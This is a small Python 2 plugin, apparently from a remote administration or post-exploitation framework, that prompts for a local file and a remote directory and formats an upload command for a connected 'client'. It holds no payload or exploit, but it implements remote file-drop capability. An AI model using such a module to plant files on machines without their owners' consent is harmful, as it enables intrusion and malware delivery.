from helpers import *
import os


class Module:
    """This module uploads a file to the client."""

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Uploads a file to the client."
        }
        self.local_file = None
        self.output_directory = None
        self.output_name = None

    def setup(self):
        self.local_file = os.path.expanduser(raw_input(MESSAGE_INPUT + "Local file to upload: "))
        self.output_directory = raw_input(MESSAGE_INPUT + "Remote output directory: ")
        self.output_name = raw_input(MESSAGE_INPUT + "New file name (ENTER to skip): ")

        if not self.output_name:
            self.output_name = os.path.basename(self.local_file)

        if not os.path.exists(self.local_file):
            print MESSAGE_ATTENTION + "Local file doesn't exist!"
            return False
        else:
            return True

    def run(self):
        return """\
        {0}:{1}:{2}
        """.format(self.local_file, self.output_directory, self.output_name)

    def process_response(self, response):
        print "\n" + response
